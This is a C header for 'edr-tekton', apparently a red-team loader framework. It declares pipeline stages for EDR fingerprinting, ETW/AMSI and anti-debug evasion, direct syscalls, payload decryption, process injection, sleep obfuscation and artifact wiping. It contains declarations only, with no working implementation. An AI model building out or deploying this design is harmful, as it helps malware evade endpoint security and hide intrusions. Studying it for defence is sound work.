#ifndef TEKTON_BUILDER_H
#define TEKTON_BUILDER_H

/*
 * edr-tekton :: Pipeline Builder
 * Chains technique modules into an execution pipeline based
 * on the loaded config profile.
 */

#include "types.h"
#include "module.h"
#include "config.h"
#include "context.h"

/* ── Pipeline Stages (execution order) ────────────────── */

typedef enum _TEKTON_STAGE {
    TEKTON_STAGE_FINGERPRINT    = 0,    /* Detect OS, EDR, capabilities  */
    TEKTON_STAGE_API_RESOLVE    = 1,    /* Resolve needed APIs           */
    TEKTON_STAGE_EVASION_PRE    = 2,    /* ETW, AMSI, anti-debug         */
    TEKTON_STAGE_SYSCALL_INIT   = 3,    /* Prepare syscall engine        */
    TEKTON_STAGE_DECRYPT        = 4,    /* Decrypt payload               */
    TEKTON_STAGE_INJECT         = 5,    /* Inject into target            */
    TEKTON_STAGE_SLEEP_INIT     = 6,    /* Set up sleep obfuscation      */
    TEKTON_STAGE_CLEANUP        = 7,    /* Wipe artifacts                */
    TEKTON_STAGE_MAX            = 8,
} TEKTON_STAGE;

/* ── Pipeline Entry ───────────────────────────────────── */

typedef struct _TEKTON_PIPELINE_ENTRY {
    TEKTON_STAGE    stage;
    PTEKTON_MODULE  module;
    BOOL            optional;       /* Skip if compat fails      */
    BOOL            executed;       /* Set after execute()        */
    TEKTON_STATUS   result;         /* Result of execute()        */
} TEKTON_PIPELINE_ENTRY, *PTEKTON_PIPELINE_ENTRY;

/* ── Pipeline ─────────────────────────────────────────── */

#define TEKTON_MAX_PIPELINE_ENTRIES 32

struct _TEKTON_PIPELINE {
    TEKTON_PIPELINE_ENTRY   entries[TEKTON_MAX_PIPELINE_ENTRIES];
    DWORD                   entry_count;
    TEKTON_CONTEXT          context;
    TEKTON_CONFIG           config;
    BOOL                    built;
    BOOL                    validated;
};

/* ── Builder API ──────────────────────────────────────── */

/* Create pipeline from config profile */
TEKTON_STATUS TektonPipelineBuild(
    PTEKTON_CONFIG   config,
    PTEKTON_PIPELINE out_pipeline
);

/* Validate pipeline (check module compat, dependencies) */
TEKTON_STATUS TektonPipelineValidate(
    PTEKTON_PIPELINE pipeline
);

/* Execute the full pipeline */
TEKTON_STATUS TektonPipelineExecute(
    PTEKTON_PIPELINE pipeline
);

/* Execute a single stage */
TEKTON_STATUS TektonPipelineExecuteStage(
    PTEKTON_PIPELINE pipeline,
    TEKTON_STAGE     stage
);

/* Dry run: validate + report what would execute */
TEKTON_STATUS TektonPipelineDryRun(
    PTEKTON_PIPELINE pipeline
);

/* Cleanup pipeline and all modules */
VOID TektonPipelineDestroy(
    PTEKTON_PIPELINE pipeline
);

/* Print pipeline plan to stdout (for debugging) */
VOID TektonPipelinePrint(
    PTEKTON_PIPELINE pipeline
);

#endif /* TEKTON_BUILDER_H */
